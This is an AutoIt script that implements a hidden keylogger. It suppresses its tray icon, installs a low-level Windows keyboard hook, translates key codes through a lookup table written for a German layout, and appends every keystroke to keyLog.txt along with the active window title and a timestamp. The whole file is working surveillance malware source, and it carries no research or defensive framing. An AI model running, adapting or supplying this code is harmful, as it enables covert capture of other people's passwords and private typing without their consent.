#include <WinAPI.au3>
#include <WindowsConstants.au3>
#NoTrayIcon

Opt('MustDeclareVars', 1)

Global $keyMapping
Global $g_hHook, $g_hStub_KeyProc, $buf = "", $title = "", $title_1 = "", $keycode, $buffer = "", $nMsg
Global $file, $f3 = 0
$file = FileOpen("keyLog.txt", 9)

_Init()
_Main()

Func _Main()
	Local $hMod
	$f3 = 1
	$g_hStub_KeyProc = DllCallbackRegister("_KeyProc2", "long", "int;wparam;lparam")
    $hMod = _WinAPI_GetModuleHandle(0)
    $g_hHook = _WinAPI_SetWindowsHookEx($WH_KEYBOARD_LL, DllCallbackGetPtr($g_hStub_KeyProc), $hMod)

	While 1
		Sleep(10)
	WEnd
EndFunc

Func _KeyProc2($nCode, $wParam, $lParam)
    Local $tKEYHOOKS
    $tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
    If $nCode < 0 Then
        Return _WinAPI_CallNextHookEx($g_hHook, $nCode, $wParam, $lParam)
	 EndIf


   If $wParam = $WM_KEYDOWN Then
       EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
	 Else
        Local $iFlags = DllStructGetData($tKEYHOOKS, "flags")
;		 If BitAND( $iFLags, $LLKHF_EXTENDED) = $LLKHF_EXTENDED Then
			ConsoleWrite("flag " & DllStructGetData($tKEYHOOKS, "flags") & @TAB & "scanCode - " & DllStructGetData($tKEYHOOKS, "scanCode") & @TAB & "vkCode - " & DllStructGetData($tKEYHOOKS, "vkCode") & @CRLF)
;		 EndIf
;        Switch $iFlags
;            Case $LLKHF_ALTDOWN
;                ConsoleWrite("$LLKHF_ALTDOWN" & @CRLF)
;            Case $LLKHF_EXTENDED
;                ConsoleWrite("$LLKHF_EXTENDED" & @CRLF)
;            Case $LLKHF_INJECTED
;                ConsoleWrite("$LLKHF_INJECTED" & @CRLF)
;            Case $LLKHF_UP
;                ConsoleWrite("$LLKHF_UP: scanCode - " & DllStructGetData($tKEYHOOKS, "scanCode") & @TAB & "vkCode - " & DllStructGetData($tKEYHOOKS, "vkCode") & @CRLF)
;        EndSwitch
    EndIf
    Return _WinAPI_CallNextHookEx($g_hHook, $nCode, $wParam, $lParam)
EndFunc   ;==>_KeyProc



Func _KeyProc($nCode, $wParam, $lParam)
	Local $tKEYHOOKS
	$tKEYHOOKS = DllStructCreate($tagKBDLLHOOKSTRUCT, $lParam)
	If $nCode < 0 Then
		Return _WinAPI_CallNextHookEx($g_hHook, $nCode, $wParam, $lParam)
	EndIf

   If $wParam = $WM_KEYDOWN Then
		EvaluateKey(DllStructGetData($tKEYHOOKS, "vkCode"))
	Else
		Local $flags = DllStructGetData($tKEYHOOKS, "flags")
		Switch $flags
			Case $LLKHF_ALTDOWN
				EvaluateKey( "scanCode" & DllStructGetData($tKEYHOOKS, "scanCode"))
			 EndSwitch
	EndIf
	Return _WinAPI_CallNextHookEx($g_hHook, $nCode, $wParam, $lParam)
EndFunc

Func EvaluateKey($keycode)
	$title = WinGetTitle("")
	$buffer =  $keyMapping.Item(String($keycode))
;	ConsoleWrite("KeyCode: " & $keycode & " ; Buffer: " & $buffer& @CRLF)

	If $title_1 <> $title Then
		$title_1 = $title
		FileWrite($file, @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF)
		FileWrite($file, $buffer)
	Else
		FileWrite($file, $buffer & @CRLF)
	EndIf
EndFunc

Func _Init()
	$keyMapping = ObjCreate("Scripting.Dictionary")
	If @error Then  _ThrowError('Error creating the dictionary object',1)

	$keyMapping.Add (   "3", "{BREAK}"            )
	$keyMapping.Add (   "8", "{BACKSPACE}"        )
	$keyMapping.Add (   "9", "{TAB}"              )
	$keyMapping.Add (  "12", "{CLEAR}"            ) ; NUMPAD5 with disabled NUMLOCK
	$keyMapping.Add (  "13", "{ENTER}"            )
	$keyMapping.Add (  "20", "{CAPSLOCK}"         )
	$keyMapping.Add (  "27", "{ESC}"              )
	$keyMapping.Add (  "32", "{SPACE}"            )
	$keyMapping.Add (  "33", "{PAGEUP}"           )
	$keyMapping.Add (  "34", "{PAGEDOWN}"         )
	$keyMapping.Add (  "35", "{END}"              )
	$keyMapping.Add (  "36", "{HOME}"             )
	$keyMapping.Add (  "37", "{LEFT}"             )
	$keyMapping.Add (  "38", "{UP}"               )
	$keyMapping.Add (  "39", "{RIGHT}"            )
	$keyMapping.Add (  "40", "{DOWN}"             )
	$keyMapping.Add (  "44", "{PRINTSCREEN}"      )
	$keyMapping.Add (  "45", "{INSERT}"           )
	$keyMapping.Add (  "46", "{DEL}"              )
	$keyMapping.Add (  "48", "0"                  )
	$keyMapping.Add (  "49", "1"                  )
	$keyMapping.Add (  "50", "2"                  )
	$keyMapping.Add (  "51", "3"                  )
	$keyMapping.Add (  "52", "4"                  )
	$keyMapping.Add (  "53", "5"                  )
	$keyMapping.Add (  "54", "6"                  )
	$keyMapping.Add (  "55", "7"                  )
	$keyMapping.Add (  "56", "8"                  )
	$keyMapping.Add (  "57", "9"                  )
	$keyMapping.Add (  "65", "A"                  )
	$keyMapping.Add (  "66", "B"                  )
	$keyMapping.Add (  "67", "C"                  )
	$keyMapping.Add (  "68", "D"                  )
	$keyMapping.Add (  "69", "E"                  )
	$keyMapping.Add (  "70", "F"                  )
	$keyMapping.Add (  "71", "G"                  )
	$keyMapping.Add (  "72", "H"                  )
	$keyMapping.Add (  "73", "I"                  )
	$keyMapping.Add (  "74", "J"                  )
	$keyMapping.Add (  "75", "K"                  )
	$keyMapping.Add (  "76", "L"                  )
	$keyMapping.Add (  "77", "M"                  )
	$keyMapping.Add (  "78", "N"                  )
	$keyMapping.Add (  "79", "O"                  )
	$keyMapping.Add (  "80", "P"                  )
	$keyMapping.Add (  "81", "Q"                  )
	$keyMapping.Add (  "82", "R"                  )
	$keyMapping.Add (  "83", "S"                  )
	$keyMapping.Add (  "84", "T"                  )
	$keyMapping.Add (  "85", "U"                  )
	$keyMapping.Add (  "86", "V"                  )
	$keyMapping.Add (  "87", "W"                  )
	$keyMapping.Add (  "88", "X"                  )
	$keyMapping.Add (  "89", "Y"                  )
	$keyMapping.Add (  "90", "Z"                  )
	$keyMapping.Add (  "91", "{LWIN}"             )
	$keyMapping.Add (  "92", "{RWIN}"             )
	$keyMapping.Add (  "93", "{APPSKEY}"          )
	$keyMapping.Add (  "95", "{SLEEP}"            )
	$keyMapping.Add (  "96", "{NUMPAD0}"          )
	$keyMapping.Add (  "97", "{NUMPAD1}"          )
	$keyMapping.Add (  "98", "{NUMPAD2}"          )
	$keyMapping.Add (  "99", "{NUMPAD3}"          )
	$keyMapping.Add ( "100", "{NUMPAD4}"          )
	$keyMapping.Add ( "101", "{NUMPAD5}"          )
	$keyMapping.Add ( "102", "{NUMPAD6}"          )
	$keyMapping.Add ( "103", "{NUMPAD7}"          )
	$keyMapping.Add ( "104", "{NUMPAD8}"          )
	$keyMapping.Add ( "105", "{NUMPAD9}"          )
	$keyMapping.Add ( "106", "{NUMPADMULT}"       )
	$keyMapping.Add ( "107", "{NUMPADADD}"        )
	$keyMapping.Add ( "109", "{NUMPADSUB}"        )
	$keyMapping.Add ( "110", "{NUMPADDOT}"        )
	$keyMapping.Add ( "111", "{NUMPADDIV}"        )
	$keyMapping.Add ( "112", "{F1}"               )
	$keyMapping.Add ( "113", "{F2}"               )
	$keyMapping.Add ( "114", "{F3}"               )
	$keyMapping.Add ( "115", "{F4}"               )
	$keyMapping.Add ( "116", "{F5}"               )
	$keyMapping.Add ( "117", "{F6}"               )
	$keyMapping.Add ( "118", "{F7}"               )
	$keyMapping.Add ( "119", "{F8}"               )
	$keyMapping.Add ( "120", "{F9}"               )
	$keyMapping.Add ( "121", "{F10}"              )
	$keyMapping.Add ( "122", "{F11}"              )
	$keyMapping.Add ( "123", "{F12}"              )
	$keyMapping.Add ( "124", "{F13}"              )
	$keyMapping.Add ( "125", "{F14}"              )
	$keyMapping.Add ( "126", "{F15}"              )
	$keyMapping.Add ( "127", "{F16}"              )
	$keyMapping.Add ( "128", "{F17}"              )
	$keyMapping.Add ( "129", "{F18}"              )
	$keyMapping.Add ( "130", "{F19}"              )
	$keyMapping.Add ( "131", "{F20}"              )
	$keyMapping.Add ( "132", "{F21}"              )
	$keyMapping.Add ( "133", "{F22}"              )
	$keyMapping.Add ( "134", "{F23}"              )
	$keyMapping.Add ( "135", "{F24}"              )
	$keyMapping.Add ( "144", "{NUMLOCK}"          )
	$keyMapping.Add ( "145", "{SCROLLLOCK}"       )
	$keyMapping.Add ( "160", "{LSHIFT}"           )
	$keyMapping.Add ( "161", "{RSHIFT}"           )
	$keyMapping.Add ( "162", "{LCTRL}"            )
	$keyMapping.Add ( "163", "{RCTRL}"            )
	$keyMapping.Add ( "164", "{LALT}"             )
	$keyMapping.Add ( "165E","{RALT}"             ) ; AltGr
	$keyMapping.Add ( "166", "{BROWSER_BACK}"     )
	$keyMapping.Add ( "167", "{BROWSER_FORWARD}"  )
	$keyMapping.Add ( "168", "{BROWSER_REFRESH}"  )
	$keyMapping.Add ( "169", "{BROWSER_STOP}"     )
	$keyMapping.Add ( "170", "{BROWSER_SEARCH}"   )
	$keyMapping.Add ( "172", "{BROWSER_HOME}"     )
	$keyMapping.Add ( "173", "{VOLUME_MUTE}"      )
	$keyMapping.Add ( "174", "{VOLUME_DOWN}"      )
	$keyMapping.Add ( "175", "{VOLUME_UP}"        )
	$keyMapping.Add ( "176", "{MEDIA_NEXT}"       )
	$keyMapping.Add ( "177", "{MEDIA_PREV}"       )
	$keyMapping.Add ( "178", "{MEDIA_STOP}"       )
	$keyMapping.Add ( "179", "{MEDIA_PLAY_PAUSE}" )
	$keyMapping.Add ( "180", "{LAUNCH_MAIL}"      )
	$keyMapping.Add ( "181", "{LAUNCH_MEDIA}"     )
	$keyMapping.Add ( "182", "{LAUNCH_APP1}"      )
	$keyMapping.Add ( "183", "{LAUNCH_APP2}"      )
	$keyMapping.Add ( "186", "ü"                  ) ;German "ü"; English "["
	$keyMapping.Add ( "187", "+"                  ) ;German "+"; English "]"
	$keyMapping.Add ( "188", ","                  ) ;German ","; English ","
	$keyMapping.Add ( "189", "-"                  ) ;German "-"; English "/"
	$keyMapping.Add ( "190", "."                  ) ;German "."; English "."
	$keyMapping.Add ( "191", "#"                  ) ;German "#"; English "\"
	$keyMapping.Add ( "192", "ö"                  ) ;German "ö"; English ";"
	$keyMapping.Add ( "219", "ß"                  ) ;German "ß"; English "-"
	$keyMapping.Add ( "220", "^"                  ) ;German "^"; English "`"
	$keyMapping.Add ( "221", "´"                  ) ;German "´"; English "="
	$keyMapping.Add ( "222", "ä"                  ) ;German "ä"; English "'"
	$keyMapping.Add ( "226", "<"                  ) ;German "<"; English "\"

	Return $buf
 EndFunc

;===============================================================================
; Description:      Display an error message and optionally exit or set
;                   error codes and return values. Enables single-line
;                   error handling for basic needs.
; Parameter(s):     $txt        = message to display
;                   [$exit]     = 1 to exit after error thrown, 0 to return
;                   [$ret]      = return value
;                   [$err]      = error code to return to parent function if $exit = 0
;                   [$ext]      = extended error code to return to parent function if $exit = 0
;                   [$time]     = time to auto-close message box, in seconds (0 = never)
; Requirement(s):   None
; Return Value(s):
; Note(s):          Icon is STOP for EXIT/FATAL errors and EXCLAMATION for NO_EXIT/WARNING errors.
;                   For single-line error-reporting. If reporting an error in a function,
;                   can call this with a Returned value as:
;                       If $fail Then Return _ThrowError("failed",0,$return_value)
; Author:           https://www.autoitscript.com/forum/profile/9370-mlowery/
;===============================================================================
Func _ThrowError($txt, $exit = 0, $ret = "", $err = 0, $ext = 0, $time = 0)
    If $exit = 0 Then
        MsgBox(48, @ScriptName, $txt, $time) ; Exclamation, return with error code
        Return SetError($err, $ext, $ret)
    Else
        MsgBox(16, @ScriptName, $txt, $time) ; Stop, quit after error
        Exit ($err)
    EndIf
EndFunc